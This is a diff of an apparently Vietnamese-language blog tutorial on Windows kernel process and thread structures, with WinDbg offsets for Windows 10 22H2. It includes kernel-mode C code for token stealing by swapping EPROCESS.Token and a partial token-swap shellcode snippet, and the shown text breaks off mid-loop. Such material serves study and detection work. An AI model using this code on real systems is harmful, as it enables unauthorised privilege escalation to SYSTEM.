@@ -1,9 +1,9 @@
 ---
-title: "Windows Process & Thread Internals: EPROCESS, KTHREAD & Exploitation"
+title: "Windows Process & Thread Internals: EPROCESS, KTHREAD và token stealing qua DKOM"
 published: 2025-10-12
-description: "Deep dive vào Windows process và thread internals - EPROCESS/KTHREAD structures, token manipulation, DKOM techniques, và practical exploitation methods."
+description: "Deep dive vào EPROCESS/KPROCESS/ETHREAD/KTHREAD, creation flow, token stealing, DKOM process hiding và thread injection — kèm lab WinDbg và phần đánh giá trung thực về việc gì còn hoạt động trên Windows 11 có HVCI."
 image: ""
-tags: ["windows", "process-internals", "privilege-escalation", "dkom"]
+tags: ["windows", "process-internals", "dkom", "kernel-exploitation"]
 category: "Cybersecurity"
 draft: false
 lang: "en"
@@ -11,913 +11,616 @@ lang: "en"
 
 ## Giới thiệu
 
-Processes và threads là fundamental building blocks của bất kỳ operating system nào. Trong Windows, việc hiểu process/thread internals không chỉ critical cho system programming mà còn essential cho privilege escalation, process hiding, và token manipulation attacks.
+Process và thread là đơn vị cơ bản của mọi operating system. Trong Windows, hiểu process/thread internals là điều kiện cần cho ba nhóm việc: system programming (driver, EDR), offensive (token stealing, process hiding, thread injection), và forensics (tìm process ẩn trong memory dump).
 
-Bài này deep dive vào kernel structures (`EPROCESS`, `KPROCESS`, `ETHREAD`, `KTHREAD`), process/thread creation flow, scheduler internals, và most importantly - practical exploitation techniques bao gồm token stealing, DKOM (Direct Kernel Object Manipulation), và process hiding.
+Bài này đi từ kernel structures (`EPROCESS`, `KPROCESS`, `ETHREAD`, `KTHREAD`) → creation flow → token stealing → DKOM → thread injection, kèm lab WinDbg để tự verify từng offset.
 
-### Tại sao Process/Thread Internals quan trọng?
+> **Đọc phần này trước khi đọc code.** Bài chia làm hai nhóm, đừng lẫn:
+>
+> - **Cần kernel mode**: token stealing bằng cách sửa `EPROCESS.Token`, DKOM (unlink `ActiveProcessLinks`, zero `ImageFileName`, sửa bitmap privileges), và APC injection qua `KeInitializeApc`. Những đoạn này chỉ chạy trong kernel driver đã nạp được (test signing, driver có chữ ký, hoặc BYOVD). Không chạy được từ user-mode, kể cả khi là Administrator.
+> - **Chạy được từ user-mode**: duplicate/impersonate token qua Win32 API, và `SetThreadContext` để đổi RIP của thread. Không cần driver, nhưng bị giới hạn bởi quyền của chính process đang chạy.
+>
+> Nếu mục tiêu chỉ là học, dựng VM Windows 10 22H2 bật test signing.
 
-**Đối với Privilege Escalation:**
-- Token stealing/manipulation → SYSTEM privileges
-- Process token duplication
-- Impersonation attacks
-- SeDebugPrivilege exploitation
+### Vì sao process/thread internals quan trọng?
 
-**Đối với Rootkit Development:**
-- Process hiding (DKOM techniques)
-- Thread hiding
-- Unlinking từ PsActiveProcessHead
-- Callback manipulation
+**Offensive / privilege escalation**
+- Token stealing → SYSTEM
+- Token duplication và impersonation
+- `SeDebugPrivilege` abuse
+- Process/thread hiding để ở lại sau khi chiếm được máy
 
-**Đối với Malware Analysis:**
-- Understanding process injection
+**Rootkit / kernel driver development**
+- DKOM: unlink khỏi `PsActiveProcessHead`
+- Zero `ImageFileName`
+- Sửa bitmap privileges trong token
+- Hook và vô hiệu hoá callback
+
+**Malware analysis / forensics**
+- Cross-process section mapping (`NtCreateSection` + `NtMapViewOfSection`)
 - Thread context analysis
-- Detecting hidden processes
+- Phát hiện process ẩn
 - Memory forensics
 
 ---
 
 ## Process Structures Overview
 
-Windows kernel maintains process information trong multiple interconnected structures:
-
 ```
-┌─────────────────────────────────────────────────┐
-│            Process Structures                    │
-├─────────────────────────────────────────────────┤
-│                                                 │
+┌───────────────────────────────────────────────┐
+│  EPROCESS (Executive Process Block)           │
+│                                               │
+│  - UniqueProcessId, InheritedFromUniqueProcessId
+│  - ImageFileName                              │
+│  - Token (EX_FAST_REF)                        │
+│  - ActiveProcessLinks                         │
+│  - VadRoot, HandleTable, Peb                  │
 │  ┌─────────────────────────────────────────┐  │
-│  │         EPROCESS                        │  │
-│  │  (Executive Process Block)              │  │
-│  │                                         │  │
-│  │  - Process ID (UniqueProcessId)        │  │
-│  │  - Parent PID (InheritedFromUniqueProcessId) │
-│  │  - Process name (ImageFileName)        │  │
-│  │  - Token pointer                        │  │
-│  │  - VAD root                             │  │
-│  │  - Handle table                         │  │
-│  │  - PEB pointer                          │  │
-│  │  - Active process links                 │  │
-│  │                                         │  │
-│  │  ┌───────────────────────────────────┐ │  │
-│  │  │      KPROCESS                     │ │  │
-│  │  │  (Kernel Process Block)           │ │  │
-│  │  │                                   │ │  │
-│  │  │  - DirectoryTableBase (CR3)       │ │  │
-│  │  │  - Process threads list           │ │  │
-│  │  │  - Process priority               │ │  │
-│  │  │  - Affinity mask                  │ │  │
-│  │  └───────────────────────────────────┘ │  │
+│  │  KPROCESS (Kernel Process Block)        │  │
+│  │  - DirectoryTableBase (CR3)             │  │
+│  │  - ThreadListHead                       │  │
+│  │  - BasePriority, AffinityMask           │  │
 │  └─────────────────────────────────────────┘  │
-│                                                 │
-│  ┌─────────────────────────────────────────┐  │
-│  │         PEB (User-mode)                 │  │
-│  │  (Process Environment Block)            │  │
-│  │                                         │  │
-│  │  - Loaded modules (LDR)                 │  │
-│  │  - Process parameters                   │  │
-│  │  - Heap information                     │  │
-│  └─────────────────────────────────────────┘  │
-│                                                 │
-└─────────────────────────────────────────────────┘
+└───────────────────────────────────────────────┘
+        │
+        │ Peb
+        ▼
+┌───────────────────────────────────────────────┐
+│  PEB (user-mode)                              │
+│  - Ldr (loaded modules)                       │
+│  - ProcessParameters                          │
+│  - Heap information                           │
+└───────────────────────────────────────────────┘
 ```
 
-### EPROCESS Structure (Simplified)
+### Offset theo build: Windows 10 22H2 x64 (19045)
 
-```c
-typedef struct _EPROCESS {
-    KPROCESS Pcb;                           // +0x000 Kernel process block
+Bảng dưới là giá trị tham chiếu cho build 19045 (nguồn: Vergilius Project, khớp với output `dt nt!_EPROCESS` thường gặp). **Đừng copy số từ blog** — offset đổi theo từng build, kể cả giữa các bản 1904x. Luôn tự kiểm tra lại trên máy bạn đang dùng:
 
-    EX_PUSH_LOCK ProcessLock;               // +0x438 Process lock
-    LARGE_INTEGER CreateTime;               // +0x440 Creation time
-    LARGE_INTEGER ExitTime;                 // +0x448 Exit time
-
-    EX_RUNDOWN_REF RundownProtect;          // +0x450
-
-    HANDLE UniqueProcessId;                 // +0x440 Process ID (PID)
-    LIST_ENTRY ActiveProcessLinks;          // +0x448 Doubly-linked list
-
-    ULONG_PTR ProcessQuotaUsage[2];         // +0x460
-    ULONG_PTR ProcessQuotaPeak[2];          // +0x470
-
-    SIZE_T VirtualSize;                     // +0x490 Virtual size
-    SIZE_T PeakVirtualSize;                 // +0x498
-
-    ULONG_PTR NumberOfPrivatePages;         // +0x4A0
-
-    LONG ModifiedPageCount;                 // +0x4A8
-
-    union {
-        struct {
-            ULONG JobNotReallyActive  : 1;
-            ULONG AccountingFolded    : 1;
-            ULONG NewProcessReported  : 1;
-            ULONG ExitProcessReported : 1;
-            // ... more flags
-        };
-        ULONG Flags;
-    } u1;
-
-    ULONG_PTR CreateTime;                   // +0x4B0
-
-    HANDLE InheritedFromUniqueProcessId;    // +0x550 Parent PID
-
-    PVOID ObjectTable;                      // +0x570 Handle table
-
-    PVOID Token;                            // +0x4B8 Process token (EX_FAST_REF)
-
-    PMM_AVL_TABLE VadRoot;                  // +0x7D8 VAD tree root
-
-    PVOID DeviceMap;                        // +0x670
-
-    PVOID Session;                          // +0x678 Session pointer
-
-    CHAR ImageFileName[15];                 // +0x5A8 Process name
-
-    LIST_ENTRY JobLinks;                    // +0x5B8
-
-    PVOID ThreadListHead;                   // +0x5E0 Head of thread list
-
-    // ... many more fields (structure is ~0x800+ bytes)
-
-} EPROCESS, *PEPROCESS;
+```
+kd> dt nt!_EPROCESS poi(nt!PsInitialSystemProcess)
 ```
 
-> **Note:** EPROCESS structure size và field offsets thay đổi giữa Windows versions. Offsets ở đây là for Windows 10 x64. Always use symbols hoặc pattern matching để locate fields dynamically trong exploits.
+| Field | Offset (19045 x64) | Ghi chú |
+|---|---|---|
+| `Pcb` (KPROCESS) | `0x000` | Luôn nằm đầu struct |
+| `ProcessLock` | `0x438` | `EX_PUSH_LOCK` |
+| `UniqueProcessId` | `0x440` | PID, kiểu `HANDLE` |
+| `ActiveProcessLinks` | `0x448` | `LIST_ENTRY`, mắt xích của `PsActiveProcessHead` |
+| `Token` | `0x4b8` | `EX_FAST_REF` — 4 bit thấp là refcount |
+| `ImageFileName` | `0x5a8` | `char[15]`, chỉ tên file, không phải full path |
 
-### Key EPROCESS Fields cho Exploitation
+Các field còn lại (`CreateTime`, `InheritedFromUniqueProcessId`, `ThreadListHead`, `Peb`, `VadRoot`) khác nhau giữa các build — lấy bằng `dt` chứ đừng đoán.
 
-**UniqueProcessId (PID):**
-- Handle value representing process
-- Used để identify processes
-- PID enumeration attacks
+### Các field quan trọng
 
-**ActiveProcessLinks:**
-- Doubly-linked list linking tất cả processes
-- Used bởi `PsActiveProcessHead`
-- **DKOM target**: Unlink để hide processes
+**UniqueProcessId** — PID. Dùng để định danh process; cũng là thứ bị sửa trong các kỹ thuật PID spoofing.
 
-**Token:**
-- Points đến process access token (`EX_FAST_REF`)
-- Contains security context (privileges, SIDs)
-- **Primary exploitation target** cho privilege escalation
+**ActiveProcessLinks** — doubly-linked list nối mọi process. Đây chính là thứ `tasklist`, Process Explorer và `PsGetNextProcess` duyệt qua. Vì vậy nó là mục tiêu số một của DKOM: unlink một mắt xích là process biến mất khỏi mọi enumeration dùng list này.
 
-**ImageFileName:**
-- 15-character process name
-- Not full path, chỉ tên file
-- Used bởi process enumeration tools
+**Token** — con trỏ tới primary access token, bọc trong `EX_FAST_REF`. Bốn bit thấp được dùng làm refcount nên **phải mask trước khi dùng như pointer**. Đây là chi tiết mà rất nhiều PoC trên mạng bỏ qua, dẫn tới crash khi dereference.
 
-**InheritedFromUniqueProcessId:**
-- Parent process ID
-- Used để build process tree
-- Forensics và detection
+**ImageFileName** — 15 byte, tên file không có path. Bị giới hạn độ dài nên không thể chứa đường dẫn đầy đủ; đó là lý do các tool enumeration phải đọc thêm `SectionBaseAddress`/`Peb` để lấy path thật.
+
+**InheritedFromUniqueProcessId** — PPID. Dùng để dựng process tree, và là nguồn của kỹ thuật PPID spoofing.
 
 ---
 
 ## Thread Structures Overview
 
-Mỗi process chứa một hoặc nhiều threads. Thread structures tương tự process structures:
-
 ```
-┌─────────────────────────────────────────────────┐
-│            Thread Structures                     │
-├─────────────────────────────────────────────────┤
-│                                                 │
+┌───────────────────────────────────────────────┐
+│  ETHREAD (Executive Thread Block)             │
+│  - Cid.UniqueThread (TID)                     │
+│  - ThreadsProcess (trỏ về EPROCESS)           │
+│  - Win32StartAddress                          │
+│  - ImpersonationInfo                          │
 │  ┌─────────────────────────────────────────┐  │
-│  │         ETHREAD                         │  │
-│  │  (Executive Thread Block)               │  │
-│  │                                         │  │
-│  │  - Thread ID (Cid.UniqueThread)        │  │
-│  │  - Process pointer (owning EPROCESS)    │  │
-│  │  - Start address                        │  │
-│  │  - Thread state                         │  │
-│  │  - Priority                             │  │
-│  │  - Impersonation token                  │  │
-│  │                                         │  │
-│  │  ┌───────────────────────────────────┐ │  │
-│  │  │      KTHREAD                      │ │  │
-│  │  │  (Kernel Thread Block)            │ │  │
-│  │  │                                   │ │  │
-│  │  │  - Thread context (registers)     │ │  │
-│  │  │  - Kernel stack                   │ │  │
-│  │  │  - TEB pointer                    │ │  │
-│  │  │  - Wait blocks                    │ │  │
-│  │  │  - Scheduling info                │ │  │
-│  │  └───────────────────────────────────┘ │  │
+│  │  KTHREAD (Kernel Thread Block)          │  │
+│  │  - Thread context (registers)           │  │
+│  │  - Kernel stack                         │  │
+│  │  - Teb pointer                          │  │
+│  │  - Wait blocks                          │  │
+│  │  - Scheduling info (priority, affinity) │  │
 │  └─────────────────────────────────────────┘  │
-│                                                 │
-│  ┌─────────────────────────────────────────┐  │
-│  │         TEB (User-mode)                 │  │
-│  │  (Thread Environment Block)             │  │
-│  │                                         │  │
-│  │  - Thread ID                            │  │
-│  │  - Last error code                      │  │
-│  │  - Thread local storage (TLS)           │  │
-│  │  - Stack base/limit                     │  │
-│  └─────────────────────────────────────────┘  │
-│                                                 │
-└─────────────────────────────────────────────────┘
+└───────────────────────────────────────────────┘
+        │
+        │ Teb
+        ▼
+┌───────────────────────────────────────────────┐
+│  TEB (user-mode)                              │
+│  - ThreadId, LastErrorValue                   │
+│  - ThreadLocalStoragePointer                  │
+│  - StackBase / StackLimit                     │
+└───────────────────────────────────────────────┘
 ```
 
-### ETHREAD Structure (Simplified)
+### Các field quan trọng
 
-```c
-typedef struct _ETHREAD {
-    KTHREAD Tcb;                            // +0x000 Kernel thread block
+**Cid** — `CLIENT_ID`, chứa cả PID (`Cid.UniqueProcess`) và TID (`Cid.UniqueThread`). Một thread luôn mang theo PID của process sở hữu.
 
-    LARGE_INTEGER CreateTime;               // +0x4B0 Thread creation time
-    LARGE_INTEGER ExitTime;                 // +0x4B8 Thread exit time
+**ThreadsProcess** — con trỏ ngược về `EPROCESS`. Đây là đường đi chuẩn để từ một thread lấy được token của process chứa nó.
 
-    union {
-        LIST_ENTRY LpcReplyChain;
-        LIST_ENTRY KeyedWaitChain;
-    };
+**Win32StartAddress** — địa chỉ bắt đầu trong user-mode. Process Explorer hiển thị field này, nên nó là công cụ hữu ích để phát hiện thread bị inject: thread hợp lệ thường trỏ vào `kernel32!BaseThreadInitThunk` hoặc `ntdll!LdrInitializeThunk` (hoặc một export của module hợp lệ), thread lạ trỏ vào vùng private memory không thuộc module nào.
 
-    PVOID LpcReplyMessage;                  // +0x4D0
-
-    ULONG LpcReplyMessageId;                // +0x4D8
-
-    CLIENT_ID Cid;                          // +0x4E0 Client ID
-    // Cid.UniqueProcess = Process ID
-    // Cid.UniqueThread = Thread ID
-
-    union {
-        KSEMAPHORE LpcReplySemaphore;
-        KSEMAPHORE KeyedWaitSemaphore;
-    };
-
-    PVOID LpcReplyMessageId;                // +0x500
-
-    PVOID ImpersonationInfo;                // +0x4F8 Impersonation token
-
-    LIST_ENTRY IrpList;                     // +0x508 Pending I/O requests
-
-    ULONG_PTR TopLevelIrp;                  // +0x518
-
-    PVOID Win32StartAddress;                // +0x520 Thread start address
-
-    PEPROCESS ThreadsProcess;               // +0x550 Owning process
-
-    PVOID StartAddress;                     // +0x640 Kernel start address
-
-    // ... more fields
-
-} ETHREAD, *PETHREAD;
-```
-
-### Key ETHREAD Fields
-
-**Cid.UniqueThread:**
-- Thread ID (TID)
-- Unique identifier cho thread
-
-**ThreadsProcess:**
-- Pointer về owning EPROCESS
-- Used để get process context từ thread
-
-**Win32StartAddress:**
-- User-mode start address của thread
-- Visible trong Process Explorer
-- Useful cho detecting injected threads
-
-**ImpersonationInfo:**
-- Points đến impersonation token (if any)
-- Used cho impersonation attacks
-- Can be different từ process token
+**ImpersonationInfo** — chỉ khác `NULL` khi thread đang impersonate. Đây là chỗ phân biệt impersonation token với primary token: hai thứ khác nhau, và nhầm lẫn giữa chúng là lỗi phổ biến khi viết PoC.
 
 ---
 
 ## Process/Thread Creation Flow
 
-Understanding creation flow giúp identify attack surfaces:
-
-### Process Creation Steps
+Hiểu flow này giúp xác định chỗ nào có thể can thiệp.
 
 ```
-CreateProcess() [User-mode]
+CreateProcess()            [user-mode, kernel32]
         ↓
-NtCreateUserProcess() [Syscall transition]
+NtCreateUserProcess()      [syscall transition]
         ↓
-PspCreateProcess() [Kernel]
+PspCreateProcess()         [kernel]
         ↓
-    ┌───────────────────────────────────┐
-    │ 1. Allocate EPROCESS structure    │
-    │    - ExAllocatePoolWithTag()      │
-    │    - Initialize fields            │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 2. Create process address space   │
-    │    - Allocate page directory (CR3)│
-    │    - Setup VAD tree               │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 3. Create process token           │
-    │    - Duplicate parent token       │
-    │    - Or create new token          │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 4. Map executable image           │
-    │    - Parse PE headers             │
-    │    - Map sections                 │
-    │    - Resolve imports              │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 5. Create initial thread          │
-    │    - PspCreateThread()            │
-    │    - Setup thread context         │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 6. Process callbacks              │
-    │    - Notify registered callbacks  │
-    │    - PsSetCreateProcessNotifyRoutine│
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 7. Insert into process list       │
-    │    - Link vào PsActiveProcessHead │
-    └───────────────────────────────────┘
+  1. ExAllocatePoolWithTag(EPROCESS)
+  2. Khởi tạo KPROCESS, gán DirectoryTableBase (CR3 mới)
+  3. Tạo token: duplicate từ parent, hoặc dùng token chỉ định
+  4. Map executable image (parse PE, map sections, resolve imports)
+  5. Tạo PEB, khởi tạo Ldr
+  6. Chèn vào ActiveProcessLinks  ← điểm xuất hiện của process mới
+        ↓
+PspCreateThread()
+        ↓
+NtResumeThread()           [process bắt đầu chạy]
 ```
 
-### Thread Creation Steps
+Hai chi tiết đáng chú ý:
+
+**Process mới vào `ActiveProcessLinks` trước khi thread chạy.** Nghĩa là có một cửa sổ ngắn mà process đã tồn tại trong list nhưng chưa thực thi gì. Đây là nền tảng của các kỹ thuật "process doppelgänging" và của việc EDR đặt callback ở `PsSetCreateProcessNotifyRoutineEx` — callback chạy ở bước tạo, trước khi code của process kịp chạy.
+
+**Token được duplicate từ parent.** Trừ khi caller có `SeAssignPrimaryTokenPrivilege` và truyền token riêng, process con thừa hưởng nguyên token của cha. Đây là lý do leo thang đặc quyền bằng cách "mượn" token của process SYSTEM hiệu quả: bạn không cần tạo token, chỉ cần tráo con trỏ.
+
+### Thread creation
 
 ```
-CreateThread() [User-mode]
+CreateThread()             [user-mode]
         ↓
-NtCreateThreadEx() [Syscall]
+NtCreateThreadEx()         [syscall]
         ↓
-PspCreateThread() [Kernel]
+PspCreateThread()
         ↓
-    ┌───────────────────────────────────┐
-    │ 1. Allocate ETHREAD structure     │
-    │    - ExAllocatePoolWithTag()      │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 2. Allocate kernel stack          │
-    │    - Non-paged pool               │
-    │    - Default: 12 KB (x64)         │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 3. Initialize KTHREAD             │
-    │    - Setup thread context         │
-    │    - Set start address            │
-    │    - Initialize registers         │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 4. Allocate TEB (user-mode)       │
-    │    - Thread Environment Block     │
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 5. Thread callbacks               │
-    │    - Notify registered callbacks  │
-    │    - PsSetCreateThreadNotifyRoutine│
-    └───────────────┬───────────────────┘
-                    ↓
-    ┌───────────────────────────────────┐
-    │ 6. Insert into process thread list│
-    │    - Ready for scheduling         │
-    └───────────────────────────────────┘
+  1. Allocate ETHREAD + KTHREAD
+  2. Allocate kernel stack
+  3. Khởi tạo TEB (user-mode)
+  4. Set Win32StartAddress
+  5. Insert vào ThreadListHead của process
+  6. Set initial context (RIP = start address, RSP = stack)
+  7. Chờ scheduler chọn
 ```
 
 ---
 
 ## Token Structure & Manipulation
 
-**Access tokens** chứa security context của process/thread. Đây là primary target cho privilege escalation.
+### TOKEN và EX_FAST_REF
 
-### TOKEN Structure (Simplified)
+`EPROCESS.Token` không phải `PTOKEN` trần mà là `EX_FAST_REF` — một `ULONG_PTR` dùng 4 bit thấp làm refcount:
 
 ```c
-typedef struct _TOKEN {
-    TOKEN_SOURCE TokenSource;               // Token source
-    LUID TokenId;                           // Token ID
-    LUID AuthenticationId;                  // Authentication ID (LUID)
-    LUID ParentTokenId;                     // Parent token ID
+// EX_FAST_REF layout (x64)
+// bit 63..4 : pointer tới TOKEN
+// bit  3..0 : refcount (tối đa 15)
 
-    LARGE_INTEGER ExpirationTime;           // Expiration time
-
-    LUID ModifiedId;                        // Modified ID
-
-    TOKEN_TYPE TokenType;                   // Primary or Impersonation
-
-    SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
-
-    ULONG DynamicCharged;
-    ULONG DynamicAvailable;
-
-    ULONG DefaultOwnerIndex;                // Default owner SID index
-
-    PSID_AND_ATTRIBUTES UserAndGroups;      // User SID + group SIDs
-    ULONG UserAndGroupCount;
-
-    PSID_AND_ATTRIBUTES RestrictedSids;     // Restricted SIDs
-    ULONG RestrictedSidCount;
-
-    PVOID Privileges;                       // Privileges (LUID_AND_ATTRIBUTES)
-    ULONG PrivilegeCount;
-
-    LUID TokenId;                           // Token identifier
-
-    ULONG SessionId;                        // Session ID
-
-    // ... more fields
-
-} TOKEN, *PTOKEN;
+PVOID raw = *(PVOID*)((PUCHAR)pEprocess + TOKEN_OFFSET);
+PTOKEN token = (PTOKEN)((ULONG_PTR)raw & ~0xFULL);   // mask bỏ refcount
 ```
 
-### Token Types
+Bỏ bước mask này là nguyên nhân crash phổ biến nhất khi thử PoC token stealing trên blog/forum.
 
-**Primary Token:**
-- Associated với process
-- Stored trong `EPROCESS.Token`
-- Inherited từ parent process (usually)
+### Token types
 
-**Impersonation Token:**
-- Associated với thread
-- Stored trong `ETHREAD.ImpersonationInfo`
-- Allows thread to act as different user
-- Used bởi services (e.g., IIS, SQL Server)
+| Loại | Lưu ở đâu | Dùng khi nào |
+|---|---|---|
+| **Primary token** | `EPROCESS.Token` | Token của process, dùng cho mọi thread mặc định |
+| **Impersonation token** | `ETHREAD.ImpersonationInfo` | Thread tạm thời "mượn" danh tính client (named pipe, RPC, IIS) |
 
-### Token Privileges
+Hai loại này **không thay thế cho nhau**. Copy primary token của SYSTEM rồi gán vào `ImpersonationInfo` sẽ không cho ra SYSTEM — access check đọc primary token của process, không đọc impersonation token của thread, trừ khi thread đang impersonate.
 
-Common privileges critical cho exploitation:
+### Privileges trong token
 
-| Privilege | Constant | Description |
-|-----------|----------|-------------|
-| SeDebugPrivilege | 20 | Debug programs |
-| SeLoadDriverPrivilege | 10 | Load/unload drivers |
-| SeTakeOwnershipPrivilege | 9 | Take ownership of files/objects |
-| SeRestorePrivilege | 18 | Restore files/directories |
-| SeBackupPrivilege | 17 | Backup files/directories |
-| SeImpersonatePrivilege | 29 | Impersonate clients |
-| SeAssignPrimaryTokenPrivilege | 3 | Replace process token |
+```c
+typedef struct _SEP_TOKEN_PRIVILEGES {
+    ULONG64 Present;          // privilege có trong token
+    ULONG64 Enabled;          // privilege đang bật
+    ULONG64 EnabledByDefault; // bật mặc định khi token được tạo
+} SEP_TOKEN_PRIVILEGES, *PSEP_TOKEN_PRIVILEGES;
+```
+
+Một privilege phải có bit trong **cả** `Present` và `Enabled` mới dùng được. Chỉ set `Enabled = Present` là đủ để bật tất cả — nhưng chỉ với những privilege đã có trong token. Nếu token của bạn không có `SeLoadDriverPrivilege` trong `Present` thì bật `Enabled` không tạo ra nó. Đây là giới hạn thật của kỹ thuật "enable all privileges" mà nhiều bài viết bỏ qua.
 
 ---
 
-## Practical Exploitation: Token Stealing
+## Token stealing: tráo primary token của process hiện tại
 
-Token stealing là classic privilege escalation technique. Idea: replace current process token với SYSTEM token.
+Ý tưởng: process SYSTEM (PID 4) đã có token toàn quyền. Thay vì tạo token mới, tráo con trỏ token của process hiện tại sang token của nó.
 
-### Technique 1: Token Stealing via EPROCESS
-
-**Step 1: Find SYSTEM process (PID 4)**
+### Bước 1 — Lấy EPROCESS của SYSTEM
 
 ```c
-PEPROCESS pSystemProcess = NULL;
+PEPROCESS pSystem = NULL;
 NTSTATUS status;
 
-// Method 1: Lookup by PID
-status = PsLookupProcessByProcessId((HANDLE)4, &pSystemProcess);
+// Cách 1: tra trực tiếp theo PID (gọn nhất)
+status = PsLookupProcessByProcessId((HANDLE)4, &pSystem);
+if (!NT_SUCCESS(status)) return status;
+// nhớ PsDereferenceProcess khi xong
 
-// Method 2: Walk process list
-PEPROCESS pCurrentProcess = PsGetCurrentProcess();
-PLIST_ENTRY pListEntry = (PLIST_ENTRY)((PUCHAR)pCurrentProcess + ACTIVEPROCESSLINKS_OFFSET);
-PLIST_ENTRY pHead = pListEntry;
+// Cách 2: tự đi danh sách ActiveProcessLinks
+PEPROCESS pSelf = PsGetCurrentProcess();
+PLIST_ENTRY head = (PLIST_ENTRY)((PUCHAR)pSelf + ACTIVEPROCESSLINKS_OFFSET);
+PLIST_ENTRY entry = head;
 
 do {
-    PEPROCESS pProcess = (PEPROCESS)((PUCHAR)pListEntry - ACTIVEPROCESSLINKS_OFFSET);
-    HANDLE pid = PsGetProcessId(pProcess);
-
-    if ((ULONG_PTR)pid == 4) {
-        pSystemProcess = pProcess;
+    PEPROCESS pProc = (PEPROCESS)((PUCHAR)entry - ACTIVEPROCESSLINKS_OFFSET);
+    if ((ULONG_PTR)PsGetProcessId(pProc) == 4) {
+        pSystem = pProc;
         break;
     }
-
-    pListEntry = pListEntry->Flink;
-} while (pListEntry != pHead);
+    entry = entry->Flink;
+} while (entry != head);
 ```
 
-**Step 2: Get SYSTEM token**
+Đi list có một cái bẫy: nếu process hiện tại **đã bị unlink** (do chính bạn làm ở phần DKOM), vòng lặp sẽ không bao giờ gặp lại `head` và treo máy. `PsLookupProcessByProcessId` an toàn hơn.
+
+### Bước 2 — Đọc token SYSTEM
 
 ```c
-// EPROCESS.Token là một EX_FAST_REF structure
-// Lower 4 bits là ref count, cần mask out
-
-PVOID pSystemToken = *(PVOID*)((PUCHAR)pSystemProcess + TOKEN_OFFSET);
-pSystemToken = (PVOID)((ULONG_PTR)pSystemToken & ~0xF); // Clear lower 4 bits
+PVOID raw = *(PVOID*)((PUCHAR)pSystem + TOKEN_OFFSET);
+PTOKEN pSystemToken = (PTOKEN)((ULONG_PTR)raw & ~0xFULL);
 ```
 
-**Step 3: Replace current process token**
+### Bước 3 — Tráo con trỏ
 
 ```c
-PEPROCESS pCurrentProcess = PsGetCurrentProcess();
-PVOID* pCurrentTokenPtr = (PVOID*)((PUCHAR)pCurrentProcess + TOKEN_OFFSET);
+PVOID* pSelfTokenSlot = (PVOID*)((PUCHAR)PsGetCurrentProcess() + TOKEN_OFFSET);
+PVOID  oldRaw = *pSelfTokenSlot;      // giữ lại để khôi phục
 
-// Save old token (optional, for cleanup)
-PVOID pOldToken = *pCurrentTokenPtr;
-
-// Steal SYSTEM token
-*pCurrentTokenPtr = pSystemToken;
-
-// Current process giờ có SYSTEM privileges!
+*pSelfTokenSlot = pSystemToken;       // tráo
 ```
 
-### Technique 2: Token Manipulation via PsReferencePrimaryToken
+Sau bước này process hiện tại có token của SYSTEM.
 
-Cách sạch hơn sử dụng documented APIs:
+**Ba điều dễ sai:**
+
+1. **Không giữ reference.** Bạn gán một pointer mà không tăng refcount. Nếu process SYSTEM thoát (gần như không bao giờ, nhưng vẫn có thể trong lúc shutdown) token bị free và bạn dereference memory đã giải phóng. PoC "sạch" phải `ObReferenceObject` token trước khi gán.
+2. **Không khôi phục.** Nếu không trả `oldRaw` về, token gốc bị leak và process thoát trong trạng thái token sai — crash khi cleanup.
+3. **Không kiểm tra thành công.** Tráo con trỏ không có nghĩa là có quyền. Phải verify bằng cách mở một handle tới object mà trước đó bị `ACCESS_DENIED`, ví dụ `\Device\PhysicalMemory`.
+
+### Có API documented để gán primary token không?
+
+Không có API kernel-mode documented nào để gán primary token tuỳ ý cho một process đang chạy. `PsReferencePrimaryToken` / `PsDereferencePrimaryToken` là documented nhưng chỉ để lấy/trả reference, không phải để gán. Hàm gán token thật là nội bộ, không export.
+
+Từ user-mode có `NtSetInformationProcess` với lớp thông tin `ProcessAccessToken`. Đây là **native API trong `ntdll`, không được document** — dùng được nhưng phải tự chịu rủi ro thay đổi giữa các bản Windows. Điều kiện: process đích phải do bạn tạo ở trạng thái suspended, và caller phải có `SeAssignPrimaryTokenPrivilege`.
 
 ```c
-PACCESS_TOKEN pSystemToken = PsReferencePrimaryToken(pSystemProcess);
-PACCESS_TOKEN pOldToken = PsReferencePrimaryToken(PsGetCurrentProcess());
-
-// Replace token
-PsDereferencePrimaryToken(pOldToken);
-SeSetTokenForProcess(PsGetCurrentProcess(), pSystemToken);
-PsDereferenceImpersonationToken(pSystemToken);
+// user-mode, không cần driver
+// 1. CreateProcess(..., CREATE_SUSPENDED) để giữ process đích chưa chạy
+// 2. NtSetInformationProcess(hProcess, ProcessAccessToken /* 9 */, &info, sizeof(info))
+//    với info = { HANDLE hToken; ULONG Reserved; }
+// 3. ResumeThread()
 ```
 
-### Token Stealing Shellcode Example
+Vì không được document, đừng dựa vào nó cho tooling dài hạn. Các kỹ thuật leo thang thực tế (Potato family, `SeImpersonatePrivilege` abuse) đi qua impersonation và named pipe: dùng API documented, không cần kernel write, và không bị PatchGuard can thiệp.
 
-Minimal shellcode cho token stealing:
+### Shellcode tráo token (position-independent)
+
+Bản rút gọn của đoạn code trên, dạng không cần relocation — dùng được trong APC injection:
 
 ```c
-// Find SYSTEM EPROCESS
-ULONG_PTR current = (ULONG_PTR)PsGetCurrentProcess();
-ULONG_PTR system = current;
+// offsets cho 19045 x64
+#define OFF_ACTIVELINKS 0x448
+#define OFF_PID         0x440
+#define OFF_TOKEN       0x4b8
 
-while (1) {
-    PLIST_ENTRY list = (PLIST_ENTRY)(system + 0x448); // ActiveProcessLinks offset
-    system = (ULONG_PTR)list->Flink - 0x448;
